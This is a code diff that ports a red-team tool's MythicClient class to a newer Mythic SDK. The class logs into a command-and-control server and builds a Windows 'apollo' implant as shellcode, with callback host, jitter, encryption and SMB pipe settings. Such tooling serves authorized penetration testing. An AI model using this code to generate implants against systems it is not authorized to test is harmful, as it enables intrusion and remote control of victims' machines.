@@ -9,10 +9,8 @@ import subprocess
 import json
 from dataclasses import dataclass, field
 from typing import Optional, TYPE_CHECKING, Tuple
-from mythic import mythic_rest
+import mythic.mythic as mythic_sdk
 import asyncio
-import os
-import contextlib
 from abc import ABC, abstractmethod
 import base64
 from functools import lru_cache
@@ -199,66 +197,59 @@ class MythicClient(ClientABC):
 
     @lru_cache(maxsize=None)
     def export_shellcode(self, profile: str, scformat: str = "Shellcode") -> Shellcode:
-        # redirecting to stdout in this method is used to suppress print statements from the
-        # "mythic" library as it uses print statements instead of warnings for notices
-        with open(os.devnull, "w") as devnull:
-            with contextlib.redirect_stdout(devnull):
-                mythic = mythic_rest.Mythic(
-                    username=self.__user,
-                    password=self.__password,
-                    server_ip=self.__host,
-                    server_port=self.__port,
-                    ssl=True,
-                    global_timeout=-1,
-                )
-                asyncio.run(mythic.login())
-        asyncio.run(mythic.set_or_create_apitoken())
+        mythic = asyncio.run(mythic_sdk.login(
+            username=self.__user,
+            password=self.__password,
+            server_ip=self.__host,
+            server_port=int(self.__port),
+            ssl=True,
+            timeout=-1,
+        ))
 
         # mythic payload settings are defined per payload rather than per listener,
         #   meaning you need to provide them via this tool
         #   default values are provided here but some can be overridden via env vars
         if profile.lower() == "smb":
-            build_vars = [
-                {"name": "pipename", "value": global_settings.mythic_smb_pipename},
-                {"name": "killdate", "value": "2030-10-12"},
-                {"name": "encrypted_exchange_check", "value": "T"},
-            ]
+            build_vars = {
+                "pipename": global_settings.mythic_smb_pipename,
+                "killdate": "2030-10-12",
+                "encrypted_exchange_check": "T"
+            }
         else:
-            build_vars = [
-                {"name": "callback_host", "value": self.__callback_url},
-                {"name": "callback_interval", "value": global_settings.mythic_callback_interval},
-                {"name": "c2_profile", "value": profile.lower()},
-                {"name": "AESPSK", "value": "aes256_hmac"},
-                {"name": "get_uri", "value": global_settings.mythic_http_geturi},
-                {"name": "post_uri", "value": global_settings.mythic_http_posturi},
-                {"name": "query_path_name", "value": global_settings.mythic_http_queryuri},
-                {"name": "proxy_host", "value": ""},
-                {"name": "proxy_port", "value": ""},
-                {"name": "proxy_user", "value": ""},
-                {"name": "proxy_pass", "value": ""},
-                {"name": "callback_port", "value": self.__callback_port},
-                {"name": "killdate", "value": "2030-10-12"},
-                {"name": "encrypted_exchange_check", "value": "T"},
-                {"name": "callback_jitter", "value": global_settings.mythic_jitter_percent},
-                {"name": "headers", "value": global_settings.mythic_http_useragent},
-            ]
+            build_vars = {
+                "callback_host": self.__callback_url,
+                "callback_interval": global_settings.mythic_callback_interval,
+                "c2_profile": profile.lower(),
+                "AESPSK": "aes256_hmac",
+                "get_uri": global_settings.mythic_http_geturi,
+                "post_uri": global_settings.mythic_http_posturi,
+                "query_path_name": global_settings.mythic_http_queryuri,
+                "proxy_host": "",
+                "proxy_port": "",
+                "proxy_user": "",
+                "proxy_pass": "",
+                "callback_port": self.__callback_port,
+                "killdate": "2030-10-12",
+                "encrypted_exchange_check": True,
+                "callback_jitter": global_settings.mythic_jitter_percent,
+                "headers": {"User-Agent": global_settings.mythic_http_useragent}
+            }
 
-        mythic_payload = mythic_rest.Payload(
+        payload = asyncio.run(mythic_sdk.create_payload(
             # TODO: currently hardcoded but should make configurable
             #   this will require different configs for different payloads
-            payload_type="apollo",
-            c2_profiles={profile.lower(): build_vars},
-            build_parameters=[{"name": "version", "value": 1.0}, {"name": "output_type", "value": scformat}],
-            tag="Built with PDCD",
-            selected_os="Windows",
+            mythic=mythic,
+            payload_type_name="apollo",
+            operating_system="Windows",
+            c2_profiles=[{"c2_profile": profile.lower(), "c2_profile_parameters": build_vars}],
+            build_parameters=[{"name": "output_type", "value": scformat}],
+            description="Built with PDCD",
             filename="pdcd",
-        )
-        resp = asyncio.run(mythic.create_payload(mythic_payload, all_commands=True, wait_for_build=True))
-        if resp.status == "error":
-            raise Exception(f"Error when generating Mythic payload: Error: {resp.response.get('error', '<ERROR>')}")
-        payload_contents = asyncio.run(mythic.download_payload(resp.response))
-        # cannot delete payloads as mythic does not allow spawning from dead payloads
-        #   asyncio.run(mythic.remove_payload(resp.response))
+            return_on_complete=True,
+            include_all_commands=True
+        ))
+        payload_contents = asyncio.run(mythic_sdk.download_payload(mythic=mythic, payload_uuid=payload.get("uuid")))
+        # note: cannot delete payloads as mythic does not allow spawning from dead payloads
         if len(payload_contents) == 0:
             raise Exception(f"Shellcode is empty")
         return Shellcode(shellcode=payload_contents)
